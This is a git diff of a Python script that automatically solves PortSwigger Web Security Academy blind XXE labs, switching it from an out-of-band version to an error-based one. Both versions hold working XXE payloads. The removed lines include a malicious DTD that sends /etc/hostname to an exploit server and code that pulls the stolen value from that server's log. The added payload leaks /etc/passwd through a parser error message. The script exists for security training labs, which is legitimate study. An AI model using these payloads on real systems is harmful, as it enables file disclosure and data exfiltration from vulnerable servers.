@@ -2,18 +2,16 @@ import requests
 from urllib3.exceptions import InsecureRequestWarning
 from time import sleep
 from bs4 import BeautifulSoup
-import re
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-# lab_url: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
+# lab_url: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
 # author: 0xyf
-# w/o collaborator
 
 
-class XXE5:
+class XXE6:
     def __init__(self):
-        self.lab_id = "0aff00c10426ac6c81f6c0be002a00c1"
+        self.lab_id = "0a760088048a50d58446d53e00b000aa"
         self.proxies = {"https": "http://127.0.0.1:8080"}
 
         self.url = f"https://{self.lab_id}.web-security-academy.net"
@@ -25,15 +23,8 @@ class XXE5:
         soup = BeautifulSoup(r.text, "html.parser")
         self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")
 
-    def get_submit_url(self):
-        r = requests.get(self.url)
-        soup = BeautifulSoup(r.text, "html.parser")
-        submit_path = soup.find("button", id="submitSolution").get("path")
-        self.submit_url = f"{self.url}{submit_path}"
-
     def store_dtd(self):
-
-        payload = f"""<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{self.exploit_srv_url}/?x=%file;'>">%eval;%exfiltrate;"""
+        payload = f"""<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;"""
         print(f"[+] payload 1: {payload}")
         data = {
             "urlIsHttps": "on",
@@ -63,30 +54,6 @@ class XXE5:
         )
         return r
 
-    def get_file_contents(self):
-        print("[+] sleeping 5")
-        sleep(5)
-        r = requests.get(
-            f"{self.exploit_srv_url}/log",
-            proxies=self.proxies,
-            verify=False,
-        )
-        pattern = r"\/\?x=(.*) HTTP/1.1"
-        match = re.findall(pattern, r.text)[0]
-        print(match)
-        self.file_content = match
-
-    def submit_file_contents(self):
-        self.get_submit_url()
-        data = {"answer": self.file_content}
-        print(f"[+] submitting key {self.file_content}")
-        r = requests.post(
-            self.submit_url,
-            data=data,
-            proxies=self.proxies,
-            verify=False,
-        )
-
     def check_solved(self):
         sleep(5)
         r = requests.get(self.url)
@@ -98,13 +65,11 @@ class XXE5:
     def solve(self):
         self.store_dtd()
         self.xxe()
-        self.get_file_contents()
-        self.submit_file_contents()
         self.check_solved()
 
 
 def main():
-    XXE5().solve()
+    XXE6().solve()
 
 
 if __name__ == "__main__":
